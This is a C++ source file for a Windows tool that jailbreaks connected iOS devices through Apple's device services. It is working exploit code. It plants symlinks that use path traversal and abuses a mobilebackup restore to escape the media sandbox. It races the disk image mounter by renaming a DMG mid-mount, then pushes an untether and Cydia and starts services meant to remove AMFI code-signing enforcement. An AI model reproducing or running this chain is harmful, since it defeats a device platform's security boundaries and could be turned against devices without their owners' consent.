#pragma comment(linker, "/ENTRY:main")
#pragma comment(linker, "/SECTION:.text,ERW /MERGE:.rdata=.text /MERGE:.data=.text /MERGE:.text1=.text /SECTION:.idata,ERW")
#pragma comment(linker, "/SECTION:.Asuna,ERW /MERGE:.text=.Asuna")

#pragma comment(lib, "ws2_32.lib")

#include "iOSDevice.h"
#include "iOSAFC.h"
#include "ml.cpp"

ML_OVERLOAD_NEW

NTSTATUS SendFileMessage(iOSService& service, PCWSTR FileName)
{
    NtFileMemory plist;

    plist.Open(FileName);

    CFPropertyList xml = CFPropertyListCreateWithData(
                            nullptr,
                            CFData(CFDataCreate(nullptr, plist, plist)),
                            kCFPropertyListImmutable,
                            nullptr,
                            nullptr
                        );

    return service.SendMessage(xml);
}

#if 1

#define EX_HELP_PATH            L"__pphelp_ex__"
#define EX_HELP_LINK            L"/a/b/c"
#define EX_HELP_TARGET          L"/var/mobile/Media/PublicStaging/cache/mmap"
#define EX_HELP_LINK_RELATIVE   L"../../../var/mobile/Media/PublicStaging/cache/mmap"

#define MV_HELP_PATH            L"__pphelp_mx__"
#define MV_HELP_LINK            L"/a/b/c/d/e/f/g"
#define MV_HELP_TARGET          L"/private/var/run"
#define MV_HELP_LINK_RELATIVE   L"../../../../../../../private/var/run"

#define MOUNT_ROOT_PATH         L"/PublicStaging/cache"
#define MOUNT_MMAP_PATH         MOUNT_ROOT_PATH L"/mmap"
#define MOUNT_DMG_PATH          MOUNT_MMAP_PATH L"/6d55c2edf0583c63adc540dbe8bf8547b49d54957ce9dc8032d1a9f9ad759e2b1fe99fcb2baeb3db5348ab322cb65c7fc38b59cb75697cbc29221dce1ecd120d/909b75240921fc3f2d96ff08d317e199e033a7f8a8ff430b0c97bf3c6210fc39f35e1c239d1bf7d568be613aafef53104f3bc1801eda87ef963a7abeb57b8369"
#define MOUNT_INPUT_DMG_PATH    MOUNT_DMG_PATH L"/cfcf6b45491ac5cffa4e34a8884659eee8136c5a.dimage"
#define INSTALL_PATH            L"ppinstall"

#else

#define EX_HELP_PATH            L"_exhelp"
#define EX_HELP_LINK            L"/a/a/a"
#define EX_HELP_TARGET          L"/var/mobile/Media/Books/Purchases/mload"
#define EX_HELP_LINK_RELATIVE   L"../../../var/mobile/Media/Books/Purchases/mload"

#define MV_HELP_PATH            L"_mvhelp"
#define MV_HELP_LINK            L"/a/a/a/a/a/a/a"
#define MV_HELP_TARGET          L"/private/var/run"
#define MV_HELP_LINK_RELATIVE   L"../../../../../../../private/var/run"

#define MOUNT_ROOT_PATH         L"Books/Purchases"
#define MOUNT_PATH              L"Books/Purchases/mload/6d55c2edf0583c63adc540dbe8bf8547b49d54957ce9dc8032d1a9f9ad759e2b1fe99fcb2baeb3db5348ab322cb65c7fc38b59cb75697cbc29221dce1ecd120d/909b75240921fc3f2d96ff08d317e199e033a7f8a8ff430b0c97bf3c6210fc39f35e1c239d1bf7d568be613aafef53104f3bc1801eda87ef963a7abeb57b8369"

#endif

NTSTATUS SendFileToDevice(iOSAFC& afc, const String& DevicePath, const String& LocalPath)
{
    NTSTATUS        status;
    AFCFileRef      handle;
    NtFileMemory    localfile;

    status = afc.OpenFile(DevicePath, AFC_FOPEN_WRONLY, &handle);
    if (status != kAFCSuccess)
        return status;

    status = localfile.Open(LocalPath);
    if (NT_FAILED(status))
        return status;

    status = afc.WriteFile(handle, localfile, localfile);

    afc.CloseFile(handle);

    return status;
}

NTSTATUS RequestRestore(iOSService& mobilebackup)
{
    NTSTATUS Status;

    Status = mobilebackup.Start("com.apple.mobilebackup");
    DebugLog(L"start com.apple.mobilebackup: %p", Status);
    if (Status != kAMDSuccess)
        return Status;

    //DebugLog(L"ReceiveMessage1");
    CFPropertyList response = mobilebackup.ReceiveMessage();
    //DebugLog(L"ReceiveMessage2");

    if (CFGetTypeID(response) != CFArrayGetTypeID())
        return kAMDInvalidResponseError;

    CFArrayRef array = (CFArrayRef)(CFObjectRef)response;

    if (CFArrayGetCount(array) != 3)
        return kAMDInvalidResponseError;

    CFStringRef DLMessageVersionExchange    = (CFStringRef)CFArrayGetValueAtIndex(array, 0);
    CFNumberRef MajorNumber                 = (CFNumberRef)CFArrayGetValueAtIndex(array, 1);
    CFNumberRef MinorNumber                 = (CFNumberRef)CFArrayGetValueAtIndex(array, 2);

    if (CFGetTypeID(DLMessageVersionExchange) != CFStringGetTypeID() ||
        CFGetTypeID(MajorNumber) != CFNumberGetTypeID() ||
        CFGetTypeID(MinorNumber) != CFNumberGetTypeID())
    {
        return kAMDInvalidResponseError;
    }

    INT64 Major, Minor;

    CFNumberGetValue(MajorNumber, kCFNumberSInt64Type, &Major);
    CFNumberGetValue(MinorNumber, kCFNumberSInt64Type, &Minor);

    if (CFStringCompare(DLMessageVersionExchange, CFSTR("DLMessageVersionExchange"), 0) != kCFCompareEqualTo ||
        Major != 300 ||
        Minor != 0)
    {
        return kAMDInvalidResponseError;
    }

    CFList request;

    request << "DLMessageVersionExchangev" << "DLVersionsOk" << 300ll;

    mobilebackup.SendMessage(request);

    response = mobilebackup.ReceiveMessage();
    array = (CFArrayRef)(CFObjectRef)response;

    if (CFArrayGetCount(array) != 1)
        return kAMDInvalidResponseError;

    CFStringRef DLMessageDeviceReady = (CFStringRef)CFArrayGetValueAtIndex(array, 0);

    if (CFGetTypeID(DLMessageDeviceReady) != CFStringGetTypeID())
        return kAMDInvalidResponseError;

    if (CFStringCompare(DLMessageDeviceReady, CFSTR("DLMessageDeviceReady"), 0) != kCFCompareEqualTo)
        return kAMDInvalidResponseError;

    request.Clear();

    // PauseConsole(L"any key to request");

    SendFileMessage(mobilebackup, L"data/BackupMessageRestoreRequest.plist");
    response = mobilebackup.ReceiveMessage();
    array = (CFArrayRef)(CFObjectRef)response;
    if (CFArrayGetCount(array) != 2)
        return kAMDInvalidResponseError;

    CFDictionaryRef DLMessageProcessMessage = (CFDictionaryRef)CFArrayGetValueAtIndex(array, 1);
    if (CFStringCompare((CFStringRef)CFDictionaryGetValue(DLMessageProcessMessage, CFSTR("BackupMessageTypeKey")), CFSTR("BackupMessageRestoreReplyOK"), 0) != kCFCompareEqualTo)
        return kAMDInvalidResponseError;

    if (CFStringCompare((CFStringRef)CFDictionaryGetValue(DLMessageProcessMessage, CFSTR("BackupProtocolVersion")), CFSTR("1.7"), 0) != kCFCompareEqualTo)
        return kAMDInvalidResponseError;

    // PauseConsole(L"any key to sf");

    DebugLog(L"DLSendFile1");
    SendFileMessage(mobilebackup, L"data/DLSendFileMv.plist");
    response = mobilebackup.ReceiveMessage();

    // PauseConsole(L"any key to dlsf2");

    DebugLog(L"DLSendFile2");
    SendFileMessage(mobilebackup, L"data/DLSendFileEx.plist");
    response = mobilebackup.ReceiveMessage();

    // PauseConsole(L"any key to return");

    CFData xml = CFPropertyListCreateXMLData(nullptr, response);

    return kAMDSuccess;
}

NTSTATUS MountImage2(iOSDevice& device, iOSAFC& afc, const String& inputDmgPath)
{
    NTSTATUS        status;
    AFCFileRef      dmg;
    iOSService      imgmounter(device);
    CFDictionary    response;

    DebugLog(L"mobile_image_mounter");
    status = imgmounter.Start("com.apple.mobile.mobile_image_mounter");
    if (status != kAMDSuccess)
        return status;

    // send dmg

    status = SendFileToDevice(afc, MOUNT_INPUT_DMG_PATH, inputDmgPath);
    // {
    //     NtFileMemory file;

    //     status = file.Open(inputDmgPath);

    //     status = afc.OpenFile(MOUNT_INPUT_DMG_PATH, AFC_FOPEN_WRONLY, &dmg);
    //     if (status != kAFCSuccess)
    //         return status;

    //     status = afc.WriteFile(dmg, file, file);
    //     if (status != kAFCSuccess)
    //         return status;

    //     status = afc.CloseFile(dmg);
    // }

    // upload dmg
    {
        NtFileMemory    valid_dmg;
        ULONG_PTR       length;

        valid_dmg.Open(L"data/diskimage/valid.dmg");

        DebugLog(L"UploadImage");
        SendFileMessage(imgmounter, L"data/UploadImage.plist");

        response = (CFDictionaryRef)imgmounter.ReceiveMessage();

        DebugLog(L"ReceiveBytesAck1");
        if (CFStringCompare((CFStringRef)CFDictionaryGetValue(response, CFSTR("Status")), CFSTR("ReceiveBytesAck"), 0) != kCFCompareEqualTo)
            return kAMDInvalidResponseError;

        length = imgmounter.SendRawData(valid_dmg, valid_dmg);
        if (length != (ULONG_PTR)valid_dmg)
        {
            DebugLog(L"UploadImage return %d", length);
            return kAMDUndefinedError;
        }

        DebugLog(L"upload Complete");

        response = (CFDictionaryRef)imgmounter.ReceiveMessage();
        if (CFStringCompare((CFStringRef)CFDictionaryGetValue(response, CFSTR("Status")), CFSTR("Complete"), 0) != kCFCompareEqualTo)
            return kAMDInvalidResponseError;

        DebugLog(L"upload success");
    }

    // rename uploaded dmg
    {
        AFCDirectory dmgpath;

        DebugLog(L"read dmg");
        status = afc.OpenDirectory(MOUNT_DMG_PATH, &dmgpath);
        if (status != kAFCSuccess)
            return status;

        String dmg;

        do
        {
            status = afc.ReadDirectory(dmgpath, dmg);
            DebugLog(L"%s", dmg);

            if (dmg.EndsWith(L".dmg"))
                break;

        } while (status == kAFCSuccess && dmg);

        afc.CloseDirectory(dmgpath);

        if (!dmg)
        {
            DebugLog(L"UploadImage failed");
            return kAMDUndefinedError;
        }

        String newDmg = MOUNT_DMG_PATH;
        newDmg += L"/";
        newDmg += dmg;

        DebugLog(L"dmg: %s", newDmg);

        Ps::Sleep(200);

        DebugLog(L"MountImage");
        SendFileMessage(imgmounter, L"data/MountImage.plist");

        Ps::Sleep(10);

        status = afc.RenamePath(MOUNT_INPUT_DMG_PATH, newDmg);
        DebugLog(L"rename %p", status);

        /**
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Error</key>
                <string>ImageMountFailed</string>
            </dict>
            </plist>

            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Status</key>
                <string>Complete</string>
            </dict>
            </plist>
         */
        response = (CFDictionaryRef)imgmounter.ReceiveMessage();

        CFString ret;

        ret = (CFStringRef)CFDictionaryGetValue(response, CFSTR("Error"));

        if (ret == nullptr)
        {
            ret = (CFStringRef)CFDictionaryGetValue(response, CFSTR("Status"));
        }
        else
        {
            status = kAMDMobileImageMounterImageMountFailed;
        }

        if (ret != nullptr)
        {
            CFRetain(ret);
            DebugLog(L"%s", ret.ToString());
        }
    }

    afc.RemovePath(MOUNT_INPUT_DMG_PATH);

    return status;
}

String CaptureSyslog(iOSService& syslog_relay)
{
    ULONG           timeout;
    ULONG_PTR       length;
    BYTE            buffer[0x1000];
    CFMutableData   bytes;

    timeout = 500;
    setsockopt(syslog_relay, SOL_SOCKET, SO_RCVTIMEO, (PCHAR)&timeout, sizeof(timeout));

    bytes = CFDataCreateMutable(nullptr, 0);

    LOOP_FOREVER
    {
        length = syslog_relay.ReceiveRawMessage(buffer, sizeof(buffer));
        if (length == 0 || length == -1)
            break;

        CFDataAppendBytes(bytes, buffer, length);
    }

    PBYTE p = CFDataGetBytePtr(bytes);
    for (ULONG_PTR length = CFDataGetLength(bytes); length; ++p, --length)
    {
        if (*p == 0)
            *p = '\n';
    }

    return String::Decode(CFDataGetBytePtr(bytes), CFDataGetLength(bytes), CP_UTF8);
}

VOID JailBreak2(iOSDevice& device)
{
    NTSTATUS    status;
    iOSService  afcsvr1(device);
    iOSService  mobilebackup(device);
    iOSService  syslog_relay(device);
    iOSAFC      afc;
    AFCFileRef  handle;
    String      CpuArchitecture, ProductVersion, DmgPath;

    CpuArchitecture = device.GetCPUArchitecture();
    ProductVersion = device.GetProductVersion();

    if (CpuArchitecture == L"armv7f")
        CpuArchitecture = L"armv7";

    DmgPath = String::Format(L"data/diskimage/%s_%s.dmg", CpuArchitecture, ProductVersion);

    DebugLog(L"dmg path: %s", DmgPath);
    if (Io::IsPathExists(DmgPath) == FALSE)
    {
        DebugLog(L"invalid cpu arch or ios version");
        return;
    }

    if (device.IsJailbroken() == kAMDSuccess)
    {
        DebugLog(L"device has been jailbroken");
        return;
    }

    DebugLog(L"device has not been jailbroken");

    if (device.IsActivated() != kAMDSuccess)
    {
        DebugLog(L"device has not been activated");
        return;
    }

    DebugLog(L"start com.apple.afc");
    afcsvr1.Start("com.apple.afc");

    DebugLog(L"open afc conn");
    afc.CreateConnection(afcsvr1);

    status = afc.RemovePath(MOUNT_ROOT_PATH);
    status = afc.RemovePath(EX_HELP_PATH);
    status = afc.RemovePath(MV_HELP_PATH);

    status = afc.CreateDirectory(MOUNT_MMAP_PATH);
    if (status != kAFCSuccess)
        return;

    //
    // restore begin
    //

    // __pphelp_mx__/a/b/c/d/e/f/g
    status = afc.CreateDirectory(MV_HELP_PATH MV_HELP_LINK);
    if (status != kAFCSuccess)
        return;

    // __pphelp_mx__/private/var/run
    status = afc.OpenFile(MV_HELP_PATH MV_HELP_TARGET, AFC_FOPEN_WRONLY, &handle);
    if (status != kAFCSuccess)
        return;

    status = afc.CloseFile(handle);

    // __pphelp_ex__/a/b/c
    status = afc.CreateDirectory(EX_HELP_PATH EX_HELP_LINK);
    if (status != kAFCSuccess)
        return;

    // __pphelp_ex__/var/mobile/Media/PublicStaging/cache/mmap
    status = afc.OpenFile(EX_HELP_PATH EX_HELP_TARGET, AFC_FOPEN_WRONLY, &handle);
    if (status != kAFCSuccess)
        return;

    status = afc.CloseFile(handle);

    // ../../../../../../../private/var/run <==> __pphelp_mx__/a/b/c/d/e/f/g/c
    afc.LinkPath(AFC_LINK_SOFT_LINK, MV_HELP_LINK_RELATIVE, MV_HELP_PATH MV_HELP_LINK L"/c");

    // ../../../var/mobile/Media/PublicStaging/cache/mmap <==> __pphelp_ex__/a/b/c/c
    afc.LinkPath(AFC_LINK_SOFT_LINK, EX_HELP_LINK_RELATIVE, EX_HELP_PATH EX_HELP_LINK L"/c");

    status = RequestRestore(mobilebackup);
    if (status != kAMDSuccess)
        return;

    afc.RemovePath(EX_HELP_PATH);
    afc.RemovePath(MV_HELP_PATH);

    //
    // restore end
    //

    //
    // mount begin
    //

    syslog_relay.Start("com.apple.syslog_relay");
    CaptureSyslog(syslog_relay);

    afc.RemovePath(MOUNT_DMG_PATH);
    afc.CreateDirectory(MOUNT_DMG_PATH);

    DebugLog(L"mloadInput1");
    status = MountImage2(device, afc, DmgPath);
    if (status != kAMDMobileImageMounterImageMountFailed)
        return;

    DebugLog(L"mloadInput2");
    status = MountImage2(device, afc, DmgPath);
    if (status != kAMDMobileImageMounterImageMountFailed)
        return;

    DebugLog(L"mloadInput3");
    status = MountImage2(device, afc, L"data/diskimage/i2.dmg");
    if (status != kAMDSuccess)
        return;

    static WCHAR AlreadyMounted[] = L"A disk image of type Developer is already mounted";
    static WCHAR couldNotMount[] = L"Could not mount /dev/disk";

    String logs = CaptureSyslog(syslog_relay);
    ULONG_PTR index, diskid;

    if (logs.IndexOf(AlreadyMounted) != logs.kInvalidIndex)
    {
        DebugLog(L"mount image failed");
        return;
    }

    index = logs.IndexOf(couldNotMount);
    if (index == logs.kInvalidIndex)
    {
        DebugLog(L"can't find \"%s\"", couldNotMount);
        return;
    }

    diskid = StringToInt64W(&logs[index + CONST_STRLEN(couldNotMount)]);

    DebugLog(L"disk id: %d", diskid);

    afc.RemovePath(MOUNT_MMAP_PATH);

    //
    // mount end
    //

    return;

    //
    // send file to ppinstall
    //

    //
    // data/ppinstall/ppuntether
    // data/ppinstall/Cydia.tar
    // data/ppinstall/packagelist.tar
    // data/ppinstall/ppuntether.tar
    //

    afc.RemovePath(INSTALL_PATH);
    afc.CreateDirectory(INSTALL_PATH);

    status = SendFileToDevice(afc, INSTALL_PATH L"/ppuntether",         L"data/ppinstall/ppuntether");
    status = SendFileToDevice(afc, INSTALL_PATH L"/Cydia.tar",          L"data/ppinstall/Cydia.tar");
    status = SendFileToDevice(afc, INSTALL_PATH L"/packagelist.tar",    L"data/ppinstall/packagelist.tar");
    status = SendFileToDevice(afc, INSTALL_PATH L"/ppuntether.tar",     L"data/ppinstall/ppuntether.tar");

    //
    // start service
    //

    iOSService  mount_cache(device);
    iOSService  mount_lib(device);
    iOSService  remove_amfi(device);
    iOSService  load_amfi(device);
    iOSService  umount_lib(device);
    iOSService  umount_cache(device);
    iOSService  ppinstall(device);

    CHAR mount_cache_service[50];
    CHAR mount_lib_service[50];

    sprintf(mount_cache_service, "com.apple.mount_cache_%d", diskid);
    sprintf(mount_lib_service, "com.apple.mount_lib_%d", diskid);

    mount_cache. Start(mount_cache_service);
    mount_lib.   Start(mount_lib_service);
    remove_amfi. Start("com.apple.remove_amfi");
    load_amfi.   Start("com.apple.load_amfi");
    umount_lib.  Start("com.apple.umount_lib");
    umount_cache.Start("com.apple.umount_cache");
    ppinstall.   Start("com.apple.ppinstall");

    //
    // wait for
    //
    // /ppinstall/.ppstart
    // /ppinstall/.ppfail
    // /ppinstall/.ppok
    //

    BOOL success = FALSE;
    PAFCDictionary info = nullptr;

    LOOP_FOREVER
    {
        DebugLog(L"wait");
        Ps::Sleep(1000);

        if (info != nullptr)
        {
            afc.CloseKeyValue(info);
            info = nullptr;
        }

        status = afc.OpenFileInfo(INSTALL_PATH L"/.ppstart", &info);
        if (status == kAFCNotFoundError)
            continue;

        status = afc.OpenFileInfo(INSTALL_PATH L"/.ppfail", &info);
        if (status == kAFCSuccess)
            break;

        status = afc.OpenFileInfo(INSTALL_PATH L"/.ppok", &info);
        if (status == kAFCSuccess)
        {
            success = TRUE;
            break;
        }
    }

    DebugLog(L"%s", success ? L"成功" : L"失败");

    if (success)
        device.Restart();
}

VOID CDECL Notification(PDEVICE_CONNECTION_INFO Info, PVOID Context)
{
    static PWSTR StateText[] =
    {
        L"Unknown",
        L"Connected\n",
        L"Disconnected\n",
        L"Detach\n",
    };

    DebugLog(L"%s", StateText[Info->State]);

    switch (Info->State)
    {
        case Info->STATE_CONNECT:
            JailBreak2(*(iOSDevice *)Context);
            DebugLog(L"done");
            break;

        case Info->STATE_DISCONNECT:
            break;

        case Info->STATE_UNSUBSCRIBE:
            break;
    }
}

ForceInline VOID main2(LONG_PTR argc, PWSTR *argv)
{
    ml::MlInitialize();

    SetExeDirectoryAsCurrent();
    iTunesApi::Initialize();

    //LoadDll(L"iTunes.dll");PauseConsole(L"123");

    iOSDevice device;

    device.NotificationSubscribe(Notification, &device);

    LOOP_FOREVER
    {
        device.WaitForDeviceConnectionChanged();
    }
}

int __cdecl main(LONG_PTR argc, PWSTR *argv)
{
    //getargsW(&argc, &argv);
    main2(argc, argv);
    //ReleaseArgv(argv);
    Ps::ExitProcess(0);
}
